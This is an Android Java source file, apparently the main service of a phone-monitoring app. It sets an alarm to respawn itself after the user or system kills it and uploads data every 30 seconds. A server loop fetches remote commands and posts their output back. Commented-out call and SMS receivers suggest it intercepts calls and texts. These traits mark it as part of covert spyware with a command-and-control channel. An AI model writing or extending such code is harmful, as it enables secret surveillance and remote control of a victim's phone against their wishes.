package com.monitor.phone.s0ft.phonemonitor;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.util.Timer;


public class MainService extends Service {

    private static final double UPLOAD_INTERVAL = 0.5;//in minutes


    @Override
    public void onCreate() {
        Log.w(AppSettings.getTAG(), "Service created");

        /*Setup an exact one-time Alarm to respawn this service(in case process is killed by Android or by user(?)) at a fixed interval(here, 1 minute)*/
        HelperMethods.createOneTimeExactAlarm(this);

        /*Fire up the RepeatTask class in a timer*/
        if (HelperMethods.getThreadsByName("RepeatTask").size() == 0) {//if timer thread doesn't exist
            RepeatTask repeatTask = new RepeatTask(this);
            try {
                new Timer("RepeatTask", false).scheduleAtFixedRate(repeatTask, 0, (long) (UPLOAD_INTERVAL * 60 * 1000));
            } catch (IllegalStateException ise) {
                Log.w(AppSettings.getTAG(), ise.getMessage());
            }
        }

        /*Start a server-talking loop thread*/
        if (HelperMethods.getThreadsByName("ServerTalkLoopThread").size() == 0) {//if server-talking thread doesn't exist
            ServerTalkLoopThread serverTalkLoopThread = new ServerTalkLoopThread(this, AppSettings.getReportURL(), AppSettings.getCommandsURL(), AppSettings.getOutputURL());
            serverTalkLoopThread.setName("ServerTalkLoopThread");
            serverTalkLoopThread.start();
            serverTalkLoopThread.startThread();
        }


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        Log.w(AppSettings.getTAG(), "Service about to be destroyed");
//        unregisterReceiver(callStateBroadcastReceiver);
//        unregisterReceiver(smsBroadcastReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

}
